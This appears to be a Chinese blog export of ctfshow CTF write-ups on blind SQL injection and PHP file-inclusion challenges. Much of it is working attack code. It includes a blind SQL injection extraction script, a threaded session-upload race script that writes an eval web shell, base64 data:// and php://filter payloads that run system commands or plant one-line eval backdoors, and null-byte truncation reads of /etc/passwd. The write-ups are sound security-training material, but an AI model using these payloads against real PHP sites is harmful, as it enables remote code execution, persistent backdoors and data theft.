 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span>  requests</span><br><span class="line">url = <span class="string">&quot;http://cd13a268-7832-48b3-91ba-9bbc519bf77d.chall.ctf.show/index.php?id=-1&#x27;/**/&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">db</span>(<span class="params">url</span>):</span>  <span class="comment"># 爆库名</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">5</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>, <span class="number">128</span>):</span><br><span class="line">            u = <span class="string">&quot;or/**/ascii(substr(database()/**/from/**/&quot;</span> + <span class="built_in">str</span>(i) + <span class="string">&quot;/**/for/**/1))=&quot;</span> + <span class="built_in">str</span>(j) + <span class="string">&quot;#&quot;</span></span><br><span class="line">            s = url + u</span><br><span class="line">            print(s)</span><br><span class="line">            r = requests.get(s)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;By Rudyard Kipling&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">                print(<span class="built_in">chr</span>(j))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">table</span>(<span class="params">url</span>):</span>  <span class="comment"># 爆表名</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">        table_name = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">6</span>):</span><br><span class="line">            <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">48</span>, <span class="number">128</span>):</span><br><span class="line">                u = <span class="built_in">id</span> = <span class="string">&quot;||/**/ascii(substr((select/**/table_name/**/from/**/information_schema.tables/**/where/**/table_schema=database()/**/limit/**/1/**/offset/**/&quot;</span> + <span class="built_in">str</span>(</span><br><span class="line">                    i) + <span class="string">&quot;)/**/from/**/&quot;</span> + <span class="built_in">str</span>(j) + <span class="string">&quot;/**/for/**/1))=&quot;</span> + <span class="built_in">str</span>(k) + <span class="string">&quot;#&quot;</span></span><br><span class="line">                s = url + u</span><br><span class="line">                print(s)</span><br><span class="line">                r = requests.get(s)</span><br><span class="line">                <span class="keyword">if</span> <span class="string">&#x27;By Rudyard Kipling&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">                    table_name += <span class="built_in">chr</span>(k)</span><br><span class="line">            print(table_name)</span><br><span class="line"></span><br><span class="line">db(url);</span><br><span class="line">table(url);</span><br></pre></td></tr></table></figure>
-]]></content>
-      <categories>
-        <category>刷题站</category>
-        <category>ctfshow</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>ctfshow入门文件包含部分</title>
-    <url>/2020/12/20/%5Bctfshow%5Dweb%E5%85%A5%E9%97%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</url>
-    <content><![CDATA[<p>ctfshow web入门 文件包含部分</p>
-<a id="more"></a>
-<h2 id="web-78"><a class="header-anchor" href="#web-78">¶</a>web 78</h2>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">payload:?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php</span><br></pre></td></tr></table></figure>
-<h2 id="web-79"><a class="header-anchor" href="#web-79">¶</a>web 79</h2>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">payload: ?file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs&#x3D;</span><br></pre></td></tr></table></figure>
-<h2 id="web-80-81"><a class="header-anchor" href="#web-80-81">¶</a>web 80-81</h2>
-<p>试了试文件日志包含漏洞</p>
-<p>先抓包,发现是nginx，一般的日志路径为  <code>/var/log/nginx/access.log</code></p>
-<p>访问发现成功</p>
-<p>进行getshell  先ls (可能需要多go几次)</p>
-<p><a href="https://imgchr.com/i/sClU7n"><img src="https://s3.ax1x.com/2021/01/03/sClU7n.png" alt="sClU7n.png"></a></p>
-<p>得到flag</p>
-<p><a href="https://imgchr.com/i/sClscF"><img src="https://s3.ax1x.com/2021/01/03/sClscF.png" alt="sClscF.png"></a></p>
-<h2 id="web82-86"><a class="header-anchor" href="#web82-86">¶</a>web82-86</h2>
-<p><strong>这题是利用 session.upload_progress 包含文件漏洞</strong></p>
-<p>session.upload_progress在php5.4添加的。</p>
-<p>在php.ini有以下几个默认选项</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1. session.upload_progress.enabled &#x3D; on</span><br><span class="line">2. session.upload_progress.cleanup &#x3D; on</span><br><span class="line">3. session.upload_progress.prefix &#x3D; &quot;upload_progress_&quot;</span><br><span class="line">4. session.upload_progress.name &#x3D; &quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span><br><span class="line">5. session.upload_progress.freq &#x3D; &quot;1%&quot;</span><br><span class="line">6. session.upload_progress.min_freq &#x3D; &quot;1&quot;</span><br></pre></td></tr></table></figure>
-<ol>
-<li>
-<p><code>enabled=on</code>表示<code>upload_progress</code>功能开始，也意味着当浏览器向服务器上传一个文件时，php将会把此次文件上传的详细信息(如上传时间、上传进度等)存储在session当中 ；</p>
-</li>
-<li>
-<p><code>cleanup=on</code>表示当文件上传结束后，php将会立即清空对应session文件中的内容，这个选项非常重要；</p>
-</li>
-<li>
-<p><code>name</code>当它出现在表单中，php将会报告上传进度，最大的好处是，它的值可控；</p>
-<p><a href="https://imgchr.com/i/sCl27R"><img src="https://s3.ax1x.com/2021/01/03/sCl27R.png" alt="sCl27R.png"></a></p>
-</li>
-<li>
-<p><code>prefix+name</code>将表示为session中的键名</p>
-</li>
-</ol>
-<p>另外，再添加个session配置中一个重要选项。</p>
-<p><code>session.use_strict_mode=off</code>这个选项默认值为off，表示我们对Cookie中sessionid可控。</p>
-<p><strong>分析</strong></p>
-<p>如果<strong>session.auto_start=On</strong> ，则PHP在接收请求的时候会自动初始化Session，不再需要执行<strong>session_start()</strong>。但默认情况下，这个选项都是关闭的。但session还有一个默认选项，<strong>session.use_strict_mode</strong>默认值为0。此时用户是可以自己定义Session ID的。比如，我们在Cookie里设置PHPSESSID=TGAO，PHP将会在服务器上创建一个文件：/tmp/sess_TGAO”。即使此时用户没有初始化Session，PHP也会自动初始化Session。 并产生一个键值，这个键值有ini.get(“session.upload_progress.prefix”)+由我们构造的session.upload_progress.name值组成，最后被写入sess_文件里。</p>
-<p>但是问题来了，默认配置<code>session.upload_progress.cleanup = on</code>导致文件上传后，session文件内容立即清空，</p>
-<p>此时我们可以利用竞争，在session文件内容清空前进行包含利用。</p>
-<p><strong>session文件默认存储路径</strong></p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">/<span class="keyword">var</span>/lib/php/sess_PHPSESSID</span><br><span class="line">/<span class="keyword">var</span>/lib/php/sessions/sess_PHPSESSID</span><br><span class="line">/tmp/sess_PHPSESSID</span><br><span class="line">/tmp/sessions/sess_PHPSESSID</span><br></pre></td></tr></table></figure>
-<p>进入正题</p>
-<p><strong>题目源码:</strong></p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">&#x2F;*</span><br><span class="line">\# -*- coding: utf-8 -*-</span><br><span class="line">\# @Author: h1xa</span><br><span class="line">\# @Date:  2020-09-16 11:25:09</span><br><span class="line">\# @Last Modified by:  h1xa</span><br><span class="line">\# @Last Modified time: 2020-09-16 19:34:45</span><br><span class="line">\# @email: h1xa@ctfer.com</span><br><span class="line">\# @link: https:&#x2F;&#x2F;ctfer.com</span><br><span class="line"></span><br><span class="line">*&#x2F;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if(isset($_GET[&#39;file&#39;]))&#123;</span><br><span class="line">  $file &#x3D; $_GET[&#39;file&#39;];</span><br><span class="line">  $file &#x3D; str_replace(&quot;php&quot;, &quot;???&quot;, $file);</span><br><span class="line">  $file &#x3D; str_replace(&quot;data&quot;, &quot;???&quot;, $file);</span><br><span class="line">  $file &#x3D; str_replace(&quot;:&quot;, &quot;???&quot;, $file);</span><br><span class="line">  $file &#x3D; str_replace(&quot;.&quot;, &quot;???&quot;, $file);</span><br><span class="line">  include($file);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">  highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<p>以POST的形式发包，上传的文件随意,下面是构造的上传表单</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;form action&#x3D;&quot;http:&#x2F;&#x2F;79b5dbc7-b641-4e30-b8d9-4278f2234938.chall.ctf.show&#x2F;&quot; method&#x3D;&quot;POST&quot; enctype&#x3D;&quot;multipart&#x2F;form-data&quot;&gt;</span><br><span class="line">    &lt;input type&#x3D;&quot;hidden&quot; name&#x3D;&quot;PHP_SESSION_UPLOAD_PROGRESS&quot; value&#x3D;&quot;123&quot; &#x2F;&gt;</span><br><span class="line">    &lt;input type&#x3D;&quot;file&quot; name&#x3D;&quot;file&quot; &#x2F;&gt;</span><br><span class="line">    &lt;input type&#x3D;&quot;submit&quot; value&#x3D;&quot;submit&quot; &#x2F;&gt;</span><br><span class="line">&lt;&#x2F;form&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>
-<p>抓包，这里我们添加一个 Cookie :PHPSESSID=flag ，session文件的位置我们根据上文的常见的几个测试，在/tmp/sess_PHPSESSID下成功访问且不报错，说明在/tmp/sess_PHPSESSID目录下, 所以PHP将会在服务器上创建一个文件：/tmp/sess_flag”    然后我们在PHP_SESSION_UPLOAD_PROGRESS下添加我们的执行代码，修改如下</p>
-<p><a href="https://imgchr.com/i/sClocD"><img src="https://s3.ax1x.com/2021/01/03/sClocD.png" alt="sClocD.png"></a></p>
-<p>因为我们在上面这个页面添加的ID值是flag，所以传参?file=/tmp/sess_flag,抓包</p>
-<p>修改如下：这个a是随便加的，主要是为了方便爆破</p>
-<p><a href="https://imgchr.com/i/sClj4P"><img src="https://s3.ax1x.com/2021/01/03/sClj4P.png" alt="sClj4P.png"></a></p>
-<p>两个包payload设置如下</p>
-<p><a href="https://imgchr.com/i/sC1SgS"><img src="https://s3.ax1x.com/2021/01/03/sC1SgS.png" alt="sC1SgS.png"></a></p>
-<p>条件竞争，将POST的包和传file的包都开启爆破，即可得到目录</p>
-<p><a href="https://imgchr.com/i/sC1PBj"><img src="https://s3.ax1x.com/2021/01/03/sC1PBj.png" alt="sC1PBj.png"></a></p>
-<p>同理也能得到flag</p>
-<p><a href="https://imgchr.com/i/sC1ZCV"><img src="https://s3.ax1x.com/2021/01/03/sC1ZCV.png" alt="sC1ZCV.png"></a></p>
-<p><strong>也可以使用python脚本</strong></p>
-<p>也直接用前面文章里的脚本：</p>
-<p>附上大佬的脚本</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">import io</span><br><span class="line">import sys</span><br><span class="line">import requests</span><br><span class="line">import threading</span><br><span class="line"></span><br><span class="line">sessid = <span class="string">&#x27;Qftm&#x27;</span></span><br><span class="line"></span><br><span class="line">def POST(session):</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        f = io.BytesIO(<span class="string">b&#x27;a&#x27;</span> * <span class="number">1024</span> * <span class="number">50</span>)</span><br><span class="line">        session.post(</span><br><span class="line">            <span class="string">&#x27;http://250307c3-cf87-4811-987f-20189fa2442c.chall.ctf.show/&#x27;</span>,</span><br><span class="line">            data=&#123;<span class="string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span>:<span class="string">&quot;&lt;?php system(&#x27;cat *&#x27;);fputs(fopen(&#x27;shell.php&#x27;,&#x27;w&#x27;),&#x27;&lt;?php @eval(<span class="subst">$_POST</span>[mtfQ])?&gt;&#x27;);?&gt;&quot;</span>&#125;,</span><br><span class="line">            files=&#123;<span class="string">&quot;file&quot;</span>:(<span class="string">&#x27;q.txt&#x27;</span>, f)&#125;,</span><br><span class="line">            cookies=&#123;<span class="string">&#x27;PHPSESSID&#x27;</span>:sessid&#125;</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">def READ(session):</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        response = session.get(f<span class="string">&#x27;http://250307c3-cf87-4811-987f-20189fa2442c.chall.ctf.show/?file=/tmp/sess_&#123;sessid&#125;&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;flag&#x27;</span> not in response.text:</span><br><span class="line">            <span class="keyword">print</span>(<span class="string">&#x27;[+++]retry&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">print</span>(response.text)</span><br><span class="line">            sys.<span class="keyword">exit</span>(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">with requests.session() <span class="keyword">as</span> session:</span><br><span class="line">    t1 = threading.Thread(target=POST, args=(session, ))</span><br><span class="line">    t1.daemon = <span class="literal">True</span></span><br><span class="line">    t1.start()</span><br><span class="line"></span><br><span class="line">    READ(session)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<p>改下url和要执行的shell即可</p>
-<p><strong>参考文章:</strong></p>
-<p><a href="https://www.freebuf.com/vuls/202819.html">https://www.freebuf.com/vuls/202819.html</a></p>
-<p><a href="https://blog.csdn.net/qq_44657899/article/details/109281343">https://blog.csdn.net/qq_44657899/article/details/109281343</a></p>
-<p><a href="https://www.cnblogs.com/NPFS/p/13795170.html">https://www.cnblogs.com/NPFS/p/13795170.html</a></p>
-<h2 id="web83"><a class="header-anchor" href="#web83">¶</a>web83</h2>
-<p><strong>源码:</strong></p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">Warning: session_destroy(): Trying to destroy uninitialized session in &#x2F;var&#x2F;www&#x2F;html&#x2F;index.php on line 14</span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">&#x2F;*</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"># @Author: h1xa</span><br><span class="line"># @Date:   2020-09-16 11:25:09</span><br><span class="line"># @Last Modified by:   h1xa</span><br><span class="line"># @Last Modified time: 2020-09-16 20:28:52</span><br><span class="line"># @email: h1xa@ctfer.com</span><br><span class="line"># @link: https:&#x2F;&#x2F;ctfer.com</span><br><span class="line"></span><br><span class="line">*&#x2F;</span><br><span class="line">session_unset();</span><br><span class="line">session_destroy();</span><br><span class="line"></span><br><span class="line">if(isset($_GET[&#39;file&#39;]))&#123;</span><br><span class="line">    $file &#x3D; $_GET[&#39;file&#39;];</span><br><span class="line">    $file &#x3D; str_replace(&quot;php&quot;, &quot;???&quot;, $file);</span><br><span class="line">    $file &#x3D; str_replace(&quot;data&quot;, &quot;???&quot;, $file);</span><br><span class="line">    $file &#x3D; str_replace(&quot;:&quot;, &quot;???&quot;, $file);</span><br><span class="line">    $file &#x3D; str_replace(&quot;.&quot;, &quot;???&quot;, $file);</span><br><span class="line"></span><br><span class="line">    include($file);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>warning提示了  ，所以表单构造需要重新构造，多了 <code>session_start();</code></p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;form action&#x3D;&quot;http:&#x2F;&#x2F;668ba926-9165-49e7-92fb-c94a08d54feb.chall.ctf.show&#x2F;&quot; method&#x3D;&quot;POST&quot; enctype&#x3D;&quot;multipart&#x2F;form-data&quot;&gt;</span><br><span class="line">&lt;input type&#x3D;&quot;hidden&quot; name&#x3D;&quot;PHP_SESSION_UPLOAD_PROGRESS&quot; value&#x3D;&quot;2333&quot; &#x2F;&gt;</span><br><span class="line">&lt;input type&#x3D;&quot;file&quot; name&#x3D;&quot;file&quot; &#x2F;&gt;</span><br><span class="line">&lt;input type&#x3D;&quot;submit&quot; value&#x3D;&quot;submit&quot; &#x2F;&gt;</span><br><span class="line">&lt;&#x2F;form&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">session_start();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-<p><strong>web82-86用py脚本都能跑过</strong></p>
-<h2 id="web84"><a class="header-anchor" href="#web84">¶</a>web84</h2>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">&#x2F;*</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"># @Author: h1xa</span><br><span class="line"># @Date:   2020-09-16 11:25:09</span><br><span class="line"># @Last Modified by:   h1xa</span><br><span class="line"># @Last Modified time: 2020-09-16 20:40:01</span><br><span class="line"># @email: h1xa@ctfer.com</span><br><span class="line"># @link: https:&#x2F;&#x2F;ctfer.com</span><br><span class="line"></span><br><span class="line">*&#x2F;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if(isset($_GET[&#39;file&#39;]))&#123;</span><br><span class="line">    $file &#x3D; $_GET[&#39;file&#39;];</span><br><span class="line">    $file &#x3D; str_replace(&quot;php&quot;, &quot;???&quot;, $file);</span><br><span class="line">    $file &#x3D; str_replace(&quot;data&quot;, &quot;???&quot;, $file);</span><br><span class="line">    $file &#x3D; str_replace(&quot;:&quot;, &quot;???&quot;, $file);</span><br><span class="line">    $file &#x3D; str_replace(&quot;.&quot;, &quot;???&quot;, $file);</span><br><span class="line">    system(&quot;rm -rf &#x2F;tmp&#x2F;*&quot;);</span><br><span class="line">    include($file);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<h2 id="web85"><a class="header-anchor" href="#web85">¶</a>web85</h2>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">&#x2F;*</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"># @Author: h1xa</span><br><span class="line"># @Date:   2020-09-16 11:25:09</span><br><span class="line"># @Last Modified by:   h1xa</span><br><span class="line"># @Last Modified time: 2020-09-16 20:59:51</span><br><span class="line"># @email: h1xa@ctfer.com</span><br><span class="line"># @link: https:&#x2F;&#x2F;ctfer.com</span><br><span class="line"></span><br><span class="line">*&#x2F;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if(isset($_GET[&#39;file&#39;]))&#123;</span><br><span class="line">    $file &#x3D; $_GET[&#39;file&#39;];</span><br><span class="line">    $file &#x3D; str_replace(&quot;php&quot;, &quot;???&quot;, $file);</span><br><span class="line">    $file &#x3D; str_replace(&quot;data&quot;, &quot;???&quot;, $file);</span><br><span class="line">    $file &#x3D; str_replace(&quot;:&quot;, &quot;???&quot;, $file);</span><br><span class="line">    $file &#x3D; str_replace(&quot;.&quot;, &quot;???&quot;, $file);</span><br><span class="line">    if(file_exists($file))&#123;</span><br><span class="line">        $content &#x3D; file_get_contents($file);</span><br><span class="line">        if(strpos($content, &quot;&lt;&quot;)&gt;0)&#123;</span><br><span class="line">            die(&quot;error&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        include($file);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<h2 id="web86"><a class="header-anchor" href="#web86">¶</a>web86</h2>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">&#x2F;*</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"># @Author: h1xa</span><br><span class="line"># @Date:   2020-09-16 11:25:09</span><br><span class="line"># @Last Modified by:   h1xa</span><br><span class="line"># @Last Modified time: 2020-09-16 21:20:43</span><br><span class="line"># @email: h1xa@ctfer.com</span><br><span class="line"># @link: https:&#x2F;&#x2F;ctfer.com</span><br><span class="line"></span><br><span class="line">*&#x2F;</span><br><span class="line">define(&#39;还要秀？&#39;, dirname(__FILE__));</span><br><span class="line">set_include_path(还要秀？);</span><br><span class="line">if(isset($_GET[&#39;file&#39;]))&#123;</span><br><span class="line">    $file &#x3D; $_GET[&#39;file&#39;];</span><br><span class="line">    $file &#x3D; str_replace(&quot;php&quot;, &quot;???&quot;, $file);</span><br><span class="line">    $file &#x3D; str_replace(&quot;data&quot;, &quot;???&quot;, $file);</span><br><span class="line">    $file &#x3D; str_replace(&quot;:&quot;, &quot;???&quot;, $file);</span><br><span class="line">    $file &#x3D; str_replace(&quot;.&quot;, &quot;???&quot;, $file);</span><br><span class="line">    include($file);</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<h2 id="web87"><a class="header-anchor" href="#web87">¶</a>web87</h2>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-16 11:25:09</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-16 21:57:55</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$content</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;content&#x27;</span>];</span><br><span class="line">    <span class="variable">$file</span> = str_replace(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = str_replace(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = str_replace(<span class="string">&quot;:&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = str_replace(<span class="string">&quot;.&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    file_put_contents(urldecode(<span class="variable">$file</span>), <span class="string">&quot;&lt;?php die(&#x27;大佬别秀了&#x27;);?&gt;&quot;</span>.<span class="variable">$content</span>);</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>分析源码，这题有两个传参，file和 content，然后将content参数的值写入到file参数所定义的文件里，但是一同写入的还有，在开头增加了die的过程，导致即使我们成功写入一句话，也执行不了，我们所要做的就是绕过die</p>
-<p>这里放上p神的 <a href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html?page=2#_1">谈一谈php://filter的妙用</a></p>
-<p>p神文章已经讲得很清楚了，base64算法解码时是4个byte一组, 而phpdie共6个字符，所以我们解码的时候需要再添加两个字符</p>
-<p><strong>payload:</strong></p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">file&#x3D;php:&#x2F;&#x2F;filter&#x2F;write&#x3D;convert.base64-decode&#x2F;resource&#x3D;1.php(file的内容需要进行两次url编码)</span><br><span class="line"></span><br><span class="line">content&#x3D;aaPD9waHAgQGV2YWwoJF9QT1NUWzFdKTs&#x2F;Pg&#x3D;&#x3D;</span><br></pre></td></tr></table></figure>
-<p>写入一句话后，然后访问 1.php，就可以执行shell了</p>
-<p><a href="https://imgchr.com/i/sC1NvD"><img src="https://s3.ax1x.com/2021/01/03/sC1NvD.png" alt="sC1NvD.png"></a></p>
-<h2 id="web88"><a class="header-anchor" href="#web88">¶</a>web88</h2>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">&#x2F;*</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"># @Author: h1xa</span><br><span class="line"># @Date:   2020-09-16 11:25:09</span><br><span class="line"># @Last Modified by:   h1xa</span><br><span class="line"># @Last Modified time: 2020-09-17 02:27:25</span><br><span class="line"># @email: h1xa@ctfer.com</span><br><span class="line"># @link: https:&#x2F;&#x2F;ctfer.com</span><br><span class="line"></span><br><span class="line"> *&#x2F;</span><br><span class="line">if(isset($_GET[&#39;file&#39;]))&#123;</span><br><span class="line">    $file &#x3D; $_GET[&#39;file&#39;];</span><br><span class="line">    if(preg_match(&quot;&#x2F;php|\~|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\-|\_|\+|\&#x3D;|\.&#x2F;i&quot;, $file))&#123;</span><br><span class="line">        die(&quot;error&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    include($file);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>data协议绕过</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">payload:?file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmwwZy5waHAnKTsgPz4</span><br><span class="line"></span><br><span class="line">即 ?file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,</span><br></pre></td></tr></table></figure>
-<h2 id="其他包含小姿势"><a class="header-anchor" href="#其他包含小姿势">¶</a>其他包含小姿势</h2>
-<p>审计中可见这样的包含模版文件：</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">include</span>(<span class="string">&quot;inc/&quot;</span> . <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>] . <span class="string">&quot;.htm&quot;</span>); <span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
-<ol>
-<li>%00截断<br>
-/etc/passwd%00<br>
-(需要 magic_quotes_gpc=off，PHP小于5.3.4有效)</li>
-<li>%00截断目录遍历：<br>
-/var/www/%00<br>
-(需要 magic_quotes_gpc=off，unix文件系统，比如FreeBSD，OpenBSD，NetBSD，Solaris)</li>
-<li>路径长度截断：<br>
-/etc/passwd/././././././.[…]/./././././.<br>
-(php版本小于5.2.8(?)可以成功，linux需要文件名长于4096，windows需要长于256)</li>
-<li>点号截断：<br>
-/boot.ini/………[…]…………<br>
-(php版本小于5.2.8(?)可以成功，只适用windows，点号需要长于256)</li>
-</ol>
-<h3 id="php-input"><a class="header-anchor" href="#php-input">¶</a>php://input</h3>
-<p>php://input协议主要用于访问各个输入/输出流。CTF中经常使用<code>file_get_contents</code>获取php://input内容(POST)，需要开启allow_url_include，并且当<code>enctype=&quot;multipart/form-data&quot;</code>的时候 php://input是无效的。</p>
-<p><strong>利用方式：<code>?file=php://input 数据利用POST传过去</code></strong></p>
-<blockquote>
-<p>碰到file_get_contents()就要想到用php://input绕过，因为php伪协议也是可以利用http协议的，即可以使用POST方式传数据。</p>
-</blockquote>
-<p>假设页面源代码为：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$file &#x3D; $_GET[&#39;file&#39;];</span><br><span class="line">if (@file_get_content($file) &#x3D;&#x3D; &#39;meizijiu&#39;) &#123;</span><br><span class="line">    echo $flag;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-<p>直接使用Hackbar工具POST数据：</p>
-<p><a href="https://imgchr.com/i/sC1DUI"><img src="https://s3.ax1x.com/2021/01/03/sC1DUI.png" alt="sC1DUI.png"></a></p>
-<p>另外还可以写入一句话</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;www.inc.com&#x2F;inc.php?file&#x3D;php:&#x2F;&#x2F;input</span><br><span class="line">post数据:</span><br><span class="line">&lt;?php </span><br><span class="line">echo file_put_contents(&quot;test.php&quot;,base64_decode(&quot;PD9waHAgZXZhbCgkX1BPU1RbJ2NjJ10pPz4&#x3D;&quot;));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
